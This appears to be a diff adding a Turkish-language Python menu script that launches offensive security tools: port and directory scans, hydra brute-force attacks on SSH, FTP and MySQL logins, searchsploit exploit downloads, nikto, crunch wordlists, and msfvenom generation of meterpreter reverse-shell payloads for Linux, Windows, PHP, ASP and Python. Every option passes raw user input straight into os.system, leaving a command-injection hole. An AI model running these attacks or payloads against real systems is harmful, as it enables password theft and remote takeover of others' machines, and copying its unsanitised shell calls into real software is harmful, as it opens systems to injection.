@@ -1,0 +1,506 @@
+#!/usr/bin/env python3
+import os
+import time
+import sys
+
+while True:
+    def figlet():
+        os.system("apt-get install figlet")
+        os.system("figlet ALLinOne")
+    figlet()
+    break
+while True:
+    print("""
+            1.ağ taraması
+            2.dizin taraması
+            3.kaba kuvvet saldırısı
+            4.subdomain keşfi
+            5.searchsploit ile exploit arama
+            6.ping gönder
+            7.msfvenom ile zararlı dosya oluştur
+            8.nikto taraması yap
+            9.crunch ile wordlist oluştur
+            """)
+    break
+
+islemno = input("bir islem numarasi seciniz:",)
+
+if islemno == "1":
+    def rustscan():
+        print("""
+                1-nmap ile tara
+                2-rustscan ile tara
+            """)
+        karar = input("Bir tarama türü numarası giriniz:",)
+
+        if karar != "1" and karar != "2":
+            print("Hata")
+
+        elif karar == "2" and islemno == "1":
+            print("rustscan taraması başlatılıyor...")
+            time.sleep(0.5)
+            targetip = input("bir ip giriniz:", )
+            result = "rustscan -a "+targetip+" "+"-- -A --ulimit 5000"
+            response1 = os.system(str(result))
+            print(response1)
+            sys.exit()
+
+        if karar == "1" or karar == "2":
+            pass
+        else:
+            sys.exit()
+    rustscan()
+
+    print("""
+            tarama türünü seçiniz
+            1-Hızlı tarama
+            2-Versiyon bilgisi göster ve scriptleri dene 
+            3-Tüm portlar hızlı ve detaylı
+            4-Belirli port aralıklarını tara
+            5-İşletim sistemi tespiti yap
+            """)
+
+    secim = input("bir secim numarası giriniz:", )
+
+    if secim == "1" and islemno == "1":
+        def nmapfastscan():
+            print("tarama başlatılıyor...")
+            time.sleep(0.5)
+            targetip = input("bir ip giriniz:", )
+            os.system("nmap -T5 --top-ports=1000 -vv "+targetip)
+        nmapfastscan()
+
+    elif secim == "2" and islemno == "1":
+        def nmapsvscscan():
+            print("tarama başlatılıyor...")
+            time.sleep(0.5)
+            targetip = input("bir ip giriniz:", )
+            os.system("nmap -T4 -Pn -sV -sC -vv "+targetip)
+        nmapsvscscan()
+
+    elif secim == "3" and islemno == "1":
+        def scanallports():
+            print("tarama başlatılıyor...")
+            time.sleep(0.5)
+            targetip = input("bir ip giriniz:", )
+            os.system("nmap -T4 -Pn -sV -sC -p- -vv "+targetip)
+        scanallports()
+
+    elif secim == "4" and islemno == "1":
+        def scansomeports():
+            print("nmap taraması başlatılıyor...")
+            time.sleep(0.5)
+            print("örnek kullanım")
+            time.sleep(0.5)
+            print("nmap -Pn -sC -sV -T4 --script vuln -p- targetip -vv")
+            hedefip = input("hedef ip adresini giriniz:",)
+            portaraligi = input("taramak istediğiniz port aralığını giriniz:",)
+            port = "nmap -Pn -sC -sV -T4 --script vuln -vv -p"+portaraligi
+            os.system(str(port) + " " + hedefip)
+        scansomeports()
+
+    elif secim == "5" and islemno == "1":
+        def detectos():
+            print("tarama başlatılıyor...")
+            time.sleep(0.5)
+            targetip = input("bir ip giriniz:", )
+            response = os.system("nmap -T4 -Pn -O "+targetip)
+            print(response)
+        detectos()
+    else:
+        print("Hata")
+
+elif islemno == "2":
+    print("""
+                tarama türünü seçiniz
+                1-Gobuster ile Standart Dizin Taraması
+                2-Tüm uzantılı dosyaları bul(.php,.txt,.js,.html,.htm,.jar,.tar,.zip,.bak,.rar) 
+                3-Dirsearch ile tarama
+                4-Dirb ile tarama
+                """)
+    print("dizin taraması başlatılıyor...")
+
+    secim = input("Bir seçim yapınız:",)
+    if islemno == "2" and secim == "1":
+        def gobuster():
+            print("Dizin tarama saldırısı başlatılıyor...")
+            time.sleep(0.5)
+            hedefip = input("hedef ip adresini giriniz:",)
+            hedefport = input("hedef portu giriniz:",)
+            ipveport = hedefip+":"+hedefport
+            tarama_kodu = "gobuster dir -w /home/kali/Desktop/directory-list-2.3-medium.txt -u http://"+ipveport
+            os.system(str(tarama_kodu))
+        gobuster()
+
+    elif islemno == "2" and secim == "2":
+        def gobuster2():
+            print("Dizin tarama saldırısı başlatılıyor...")
+            time.sleep(0.5)
+            hedefip = input("hedef ip adresini giriniz:",)
+            hedefport = input("hedef portu giriniz:",)
+            ipveport = hedefip+":"+hedefport
+            code = "gobuster dir -w /home/kali/Desktop/directory-list-2.3-medium.txt -u http://" + ipveport +" "+ "-x .php,.txt,.js,.html,.htm,.jar,.tar,.zip,.bak,.rar"
+            os.system(str(code))
+        gobuster2()
+
+    elif islemno == "2" and secim == "3":
+        def dirsearch():
+            print("Dizin tarama saldırısı başlatılıyor...")
+            time.sleep(0.5)
+            hedefip = input("hedef ip giriniz:",)
+            dirsearchscan = "dirsearch -u http://"+hedefip
+            os.system(str(dirsearchscan))
+        dirsearch()
+
+    elif islemno == "2" and secim == "4":
+        def dirb():
+            print("Dizin tarama saldırısı başlatılıyor...")
+            time.sleep(0.5)
+            hedefip = input("hedef ip giriniz:",)
+            hedefport = input("hedef port giriniz:",)
+            ipveport = hedefip + ":" + hedefport
+            dirbscan = "dirb http://"+ipveport
+            os.system(str(dirbscan))
+        dirb()
+
+    else:
+        print("Hata")
+
+elif islemno == "3":
+    print(
+        """
+        1-ssh bruteforce
+        2-ftp bruteforce
+        3-mysql bruteforce
+        """)
+    secim = input("Bir servis türü numarası seçiniz:",)
+    if secim == "1":
+        print(
+            """
+            1-Kullanıcı adı varsa; Şifre'yi Kır
+            2-Kullanıcı adı ve Parola'yı Wordlist ile Kır
+            3-ssh farklı bir portta çalışıyorsa ve kullanıcı adı varsa Şifre'yi Kır
+            4-ssh farklı bir portta çalışıyorsa ve kullanıcı adı, password bilinmiyorsa
+            """)
+        secenek = input("Bir Numara Seçiniz:",)
+        if secim == "1" and secenek == "1":
+            def sshpw():
+                print("Örnek Kullanım: hydra -l 'nick' -P 'parolawordlist' ssh://ip -Vf")
+                time.sleep(0.5)
+                username = input("Kullanıcı adını Giriniz:",)
+                passwordtxt = input("Şifrelerin içerisinde olduğu dosya yolunu yazınız:",)
+                targetip = input("Hedef ip Adresini Giriniz:",)
+                result = "hydra -l "+username+" "+"-P"+" "+passwordtxt+" "+"ssh://"+targetip+" "+"-Vf"
+                os.system(str(result))
+            sshpw()
+
+        if secim == "1" and secenek == "2":
+            def sshidpw():
+                print("Örnek Kullanım: hydra -L 'nickwordlist' -P 'parolawordlist' ssh://ip -Vf")
+                time.sleep(0.5)
+                usernametxt = input("Kullanıcı adlarının içerisinde olduğu dosya yolunu Giriniz:",)
+                passwordtxt = input("Şifrelerin içerisinde olduğu dosya yolunu yazınız:",)
+                targetip = input("Hedef ip Adresini Giriniz:",)
+                result = "hydra -L "+usernametxt+" "+"-P"+" "+passwordtxt+" "+"ssh://"+targetip+" "+"-Vf"
+                os.system(str(result))
+            sshidpw()
+
+        if secim == "1" and secenek == "3":
+            def sshportpw():
+                print("Örnek Kullanım: hydra -l 'nick' -P 'parolawordlist' -V 'ipadresi' ssh -s 'portno' -t 4")
+                time.sleep(0.5)
+                username = input("Kullanıcı adını Giriniz:", )
+                passwordtxt = input("Şifrelerin içerisinde olduğu dosya yolunu yazınız:", )
+                targetip = input("Hedef ip Adresini Giriniz:", )
+                portno = input("Port Giriniz:",)
+                result = "hydra -l "+username+" "+"-P"+" "+passwordtxt+" "+"-V"+" "+targetip+" "+"ssh -s"+portno+" "+"-t 4"
+                os.system(str(result))
+            sshportpw()
+
+        if secim == "1" and secenek == "4":
+            def sshportidpw():
+                print("Örnek Kullanım: hydra -L 'nickwordlist' -P 'parolawordlist' -V 'ipadresi' ssh -s 'portno' -t 4")
+                time.sleep(0.5)
+                usertxt = input("Kullanıcı adlarının içerisinde olduğu dosya yolunu Giriniz:",)
+                passtxt = input("Şifrelerin içerisinde olduğu dosya yolunu yazınız:",)
+                targetip = input("Hedef ip Adresini Giriniz:",)
+                portno = input("Port Giriniz:",)
+                result = "hydra -L "+usertxt+" "+"-P"+" "+passtxt+" "+"-V"+" "+targetip+" "+"ssh -s"+portno+" "+"-t 4"
+                os.system(str(result))
+            sshportidpw()
+
+    if secim == "2":
+        print(
+            """
+            1-Kullanıcı adı varsa; Şifre'yi Kır
+            2-Kullanıcı adı ve Parola'yı Wordlist ile Kır
+            3-ftp farklı bir portta çalışıyorsa ve kullanıcı adı varsa Şifre'yi Kır
+            4-ftp farklı bir portta çalışıyorsa ve kullanıcı adı, password bilinmiyorsa
+            """)
+
+        secenek2 = input("Bir Numara Seçiniz:", )
+
+        if secim == "2" and secenek2 == "1":
+            def ftppw():
+                print("Örnek Kullanım: hydra -l 'nick' -P 'parolawordlist' ftp://ip -Vf")
+                time.sleep(0.5)
+                username = input("Kullanıcı adını Giriniz:", )
+                passwordtxt = input("Şifrelerin içerisinde olduğu dosya yolunu yazınız:", )
+                targetip = input("Hedef ip Adresini Giriniz:", )
+                result = "hydra -l " + username + " " + "-P" + " " + passwordtxt + " " + "ftp://" + targetip + " " + "-Vf"
+                os.system(str(result))
+            ftppw()
+
+        if secim == "2" and secenek2 == "2":
+            def ftpidpw():
+                print("Örnek Kullanım: hydra -L 'nickwordlist' -P 'parolawordlist' ftp://ip -Vf")
+                time.sleep(0.5)
+                usernametxt = input("Kullanıcı adlarının içerisinde olduğu dosya yolunu Giriniz:", )
+                passwordtxt = input("Şifrelerin içerisinde olduğu dosya yolunu yazınız:", )
+                targetip = input("Hedef ip Adresini Giriniz:", )
+                result = "hydra -L " + usernametxt + " " + "-P" + " " + passwordtxt + " " + "ftp://" + targetip + " "+"-Vf"
+                os.system(str(result))
+            ftpidpw()
+
+        if secim == "2" and secenek2 == "3":
+            def ftpportpw():
+                print("Örnek Kullanım: hydra -l 'nick' -P 'parolawordlist' -V 'ipadresi' ftp -s 'portno' -t 4")
+                time.sleep(0.5)
+                username = input("Kullanıcı adını Giriniz:", )
+                passwordtxt = input("Şifrelerin içerisinde olduğu dosya yolunu yazınız:", )
+                targetip = input("Hedef ip Adresini Giriniz:", )
+                portno = input("Port Giriniz:", )
+                result = "hydra -l " + username + " " + "-P" + " " + passwordtxt + " " + "-V" + " " + targetip + " " + "ftp -s" + portno + " " + "-t 4"
+                os.system(str(result))
+            ftpportpw()
+
+        if secim == "2" and secenek2 == "4":
+            def ftpportidpw():
+                print("Örnek Kullanım: hydra -L 'nickwordlist' -P 'parolawordlist' -V 'ipadresi' ftp -s 'portno' -t 4")
+                time.sleep(0.5)
+                usertxt = input("Kullanıcı adlarının içerisinde olduğu dosya yolunu Giriniz:", )
+                passtxt = input("Şifrelerin içerisinde olduğu dosya yolunu yazınız:", )
+                targetip = input("Hedef ip Adresini Giriniz:", )
+                portno = input("Port Giriniz:", )
+                result = "hydra -L " + usertxt + " " + "-P" + " " + passtxt + " " + "-V" + " " + targetip + " " + "ftp -s" + portno + " " + "-t 4"
+                os.system(str(result))
+            ftpportidpw()
+
+    if secim == "3":
+        print(
+            """
+            1-Kullanıcı adı varsa; Şifre'yi Kır
+            2-Kullanıcı adı ve Parola'yı Wordlist ile Kır
+            3-mysql farklı bir portta çalışıyorsa ve kullanıcı adı varsa Şifre'yi Kır
+            4-mysql farklı bir portta çalışıyorsa ve kullanıcı adı, password bilinmiyorsa
+            """)
+
+        secenek3 = input("Bir Numara Seçiniz:", )
+        if secim == "3" and secenek3 == "1":
+            def mysqlpw():
+                print("Örnek Kullanım: hydra -l 'nick' -P 'parolawordlist' mysql://ip:3306 -Vf")
+                time.sleep(0.5)
+                username = input("Kullanıcı adını Giriniz:", )
+                passwordtxt = input("Şifrelerin içerisinde olduğu dosya yolunu yazınız:", )
+                targetip = input("Hedef ip Adresini Giriniz:", )
+                result = "hydra -l " + username + " " + "-P" + " " + passwordtxt + " " + "mysql://" +targetip+":3306" + " " + "-Vf"
+                os.system(str(result))
+            mysqlpw()
+
+        if secim == "3" and secenek3 == "2":
+            def mysqlidpw():
+                print("Örnek Kullanım: hydra -L 'nickwordlist' -P 'parolawordlist' mysql://ip:3306 -Vf")
+                time.sleep(0.5)
+                usernametxt = input("Kullanıcı adlarının içerisinde olduğu dosya yolunu Giriniz:", )
+                passwordtxt = input("Şifrelerin içerisinde olduğu dosya yolunu yazınız:", )
+                targetip = input("Hedef ip Adresini Giriniz:", )
+                result = "hydra -L " + usernametxt + " " + "-P" + " " + passwordtxt + " " + "mysql://" +targetip+":3306" + " "+"-Vf"
+                os.system(str(result))
+            mysqlidpw()
+
+        if secim == "3" and secenek3 == "3":
+            def mysqlportpw():
+                print("Örnek Kullanım: hydra -l 'nick' -P 'parolawordlist' -V 'ipadresi' mysql -s 'portno' -t 4")
+                time.sleep(0.5)
+                username = input("Kullanıcı adını Giriniz:", )
+                passwordtxt = input("Şifrelerin içerisinde olduğu dosya yolunu yazınız:", )
+                targetip = input("Hedef ip Adresini Giriniz:", )
+                portno = input("Port Giriniz:", )
+                result = "hydra -l " + username + " " + "-P" + " " + passwordtxt + " " + "-V" + " " + targetip + " " + "mysql -s" + portno + " " + "-t 4"
+                os.system(str(result))
+            mysqlportpw()
+
+        if secim == "3" and secenek3 == "4":
+            def mysqlportidpw():
+                print("Örnek Kullanım: hydra -L 'nickwordlist' -P 'parolawordlist' -V 'ipadresi' mysql -s 'portno' -t 4")
+                time.sleep(0.5)
+                usertxt = input("Kullanıcı adlarının içerisinde olduğu dosya yolunu Giriniz:", )
+                passtxt = input("Şifrelerin içerisinde olduğu dosya yolunu yazınız:", )
+                targetip = input("Hedef ip Adresini Giriniz:", )
+                portno = input("Port Giriniz:", )
+                result = "hydra -L " + usertxt + " " + "-P" + " " + passtxt + " " + "-V" + " " + targetip + " " + "mysql -s" + portno + " " + "-t 4"
+                os.system(str(result))
+            mysqlportidpw()
+
+elif islemno == "4":
+    print(
+        """
+        1-Gobuster Kullanarak Subdomain Keşfi Yap
+        2-Subfinder kullanarak Alt Domainleri Bul
+        """)
+
+    select = input("Bir Numara Seçiniz:",)
+
+    if select == "1" and islemno == "4":
+        def gobustervhost():
+            print("altdomain taraması başlatılıyor...")
+            time.sleep(0.5)
+            print("gobuster vhost hedefip -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt")
+            hedefip = input("hedef ip giriniz:",)
+            code = "gobuster vhost -u"+ " " +hedefip+ " " + "-w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt"
+            os.system(str(code))
+        gobustervhost()
+
+    elif select == "2" and islemno == "4":
+        def subfinder():
+            print("altdomain taraması başlatılıyor...")
+            time.sleep(0.5)
+            print("Örnek Kullanım: subfinder -d websiteadı")
+            target = input("Hedef ip adresini girin:",)
+            result = "subfinder -d" + " " +target
+            os.system(str(result))
+        subfinder()
+
+    else:
+        print("Hata")
+
+elif islemno == "5":
+    def searchsploit():
+        print("searchsploit ile exploit araması başlatılıyor...")
+        time.sleep(0.5)
+        print("Örnek Kullanım: searchsploit + aramak istediğiniz exploit")
+        searchexploit = input("Aramak istediğiniz exloiti giriniz:",)
+        result = os.system("searchsploit " +str(searchexploit))
+        print(str(result))
+        searchsploit2 = input("İndirmek istediğiniz exploiti Yazın:",)
+        result2 = os.system("searchsploit -m "+str(searchsploit2))
+        return result2
+    searchsploit()
+
+elif islemno == "6":
+    def pinggonder():
+        print("ping sorgusu başlatılıyor...")
+        time.sleep(0.5)
+        print("ping -c 3 hedefip")
+        hedefip = input("bir ip giriniz:",)
+        os.system(str('ping -c 3 ')+hedefip)
+    pinggonder()
+
+elif islemno == "7":
+    print("""
+            Örnek Kullanım: msfvenom -p payload LHOST=host LPORT=port(lokalde) -f exe > shell.exe
+
+            1- Linux yürütülen ve bağlanabilen(elf)
+            msfvenom -p linux/x86/meterpreter/reverse_tcp LSHOT=... LPORT=... -f elf > rev_shell.elf
+        
+            2- Windows için
+            msfvenom -p windows/meterpreter/reverse_tcp LHOST=... LPORT=... -f exe > rev_shell.exe
+            
+            3- PHP için
+            msfvenom -p php/meterpreter_reverse_tcp LHOST=... LPORT=... -f raw > rev_shell.php
+            
+            4- ASP için
+            msfvenom -p windows/meterpreter/reverse_tcp LHOST=... LPORT=... -f asp > rev_shell.asp
+            
+            5- Python için
+            msfvenom  -p cmd/unix/reverse_python LHOST=... LPORT=... -f raw > raw_shell.py
+            """)
+
+    secim = input("Bir seçim numarası giriniz:",)
+
+    if secim == "1" and islemno == "7":
+        def linuxelf():
+            print("msfvenom başlatılıyor...")
+            time.sleep(0.5)
+            print("msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=... LPORT=... -f elf > rev_shell.elf")
+            lhost = input("İp adresinizi Giriniz:",)
+            lport = input("Dinlemeye alacağınız port numarasını giriniz:",)
+            code = "msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST="+lhost+" LPORT="+lport+" -f elf > rev_shell.elf"
+            os.system(str(code))
+        linuxelf()
+
+    elif secim == "2" and islemno == "7":
+        def windowsexe():
+            print("msfvenom başlatılıyor...")
+            time.sleep(0.5)
+            print("msfvenom -p windows/meterpreter/reverse_tcp LHOST=... LPORT=... -f exe > rev_shell.exe")
+            lhost = input("İp adresinizi Giriniz:",)
+            lport = input("Dinlemeye alacağınız port numarasını giriniz:",)
+            finalcode = "msfvenom -p windows/meterpreter/reverse_tcp LHOST="+lhost+" LPORT="+lport+" -f exe > rev_shell.exe"
+            os.system(str(finalcode))
+        windowsexe()
+
+    elif secim == "3" and islemno == "7":
+        def php():
+            print("msfvenom başlatılıyor...")
+            time.sleep(0.5)
+            print("msfvenom -p php/meterpreter_reverse_tcp LHOST=... LPORT=... -f raw > rev_shell.php")
+            lhost = input("İp adresinizi Giriniz:",)
+            lport = input("Dinlemeye alacağınız port numarasını giriniz:",)
+            finalcode = "msfvenom -p php/meterpreter_reverse_tcp LHOST="+lhost+" LPORT="+lport+" -f raw > rev_shell.php"
+            os.system(str(finalcode))
+        php()
+
+    elif secim == "4" and islemno == "7":
+        def asp():
+            print("msfvenom başlatılıyor...")
+            time.sleep(0.5)
+            print("msfvenom -p windows/meterpreter/reverse_tcp LHOST=... LPORT=... -f asp > rev_shell.asp")
+            lhost = input("İp adresinizi Giriniz:",)
+            lport = input("Dinlemeye alacağınız port numarasını giriniz:",)
+            finalcode = "msfvenom -p windows/meterpreter/reverse_tcp LHOST="+lhost+" LPORT="+lport+" -f asp > rev_shell.asp"
+            os.system(str(finalcode))
+        asp()
+
+    elif secim == "5" and islemno == "7":
+        def py():
+            print("msfvenom başlatılıyor...")
+            time.sleep(0.5)
+            print("msfvenom  -p cmd/unix/reverse_python LHOST=... LPORT=... -f raw > raw_shell.py")
+            lhost = input("İp adresinizi Giriniz:",)
+            lport = input("Dinlemeye alacağınız port nuamrasını giriniz:",)
+            finalcode = "msfvenom -p cmd/unix/reverse_python LHOST="+lhost+" LPORT="+lport+" -f raw > rev_shell.py"
+            os.system(str(finalcode))
+        py()
+
+    else:
+        print("Hata")
+
+elif islemno == "8":
+    def nikto():
+        print("nikto taraması başlatılıyor...")
+        time.sleep(0.5)
+        print("Örnek kullanım: nikto -h hedefip")
+        targetip = input("Hedef ip'yi giriniz:",)
+        os.system("nikto -h "+targetip)
+    nikto()
+
+elif islemno == "9":
+    def crunchlist():
+        print("crunch ile wordlist oluşturma başlatılıyor...")
+        time.sleep(0.5)
+        print("Örnek kullanım: crunch 8 8 asdfmni -o wordlist.txt")
+        time.sleep(0.5)
+        minimum = input("Minimum kaç karakter olsun?:",)
+        maximum = input("Maximum kaç karakter olsun?:",)
+        characters = input("Kullanılmasını istediğiniz karakterleri giriniz:",)
+        output = input("Nereye kaydedilsin?:",)
+        filename = input("Dosya adı ne olsun?:",)
+        result = "crunch " + minimum + " " + maximum + " "+characters+" "+"-o"+" "+output+"/"+filename
+        os.system(str(result))
+        print("Wordlist oluşturma işlemi başarıyla tamamlandı.")
+
+    crunchlist()
+
+else:
+    print("Lütfen 1'den 9'a Kadar Bir İşlem Numarası Giriniz")
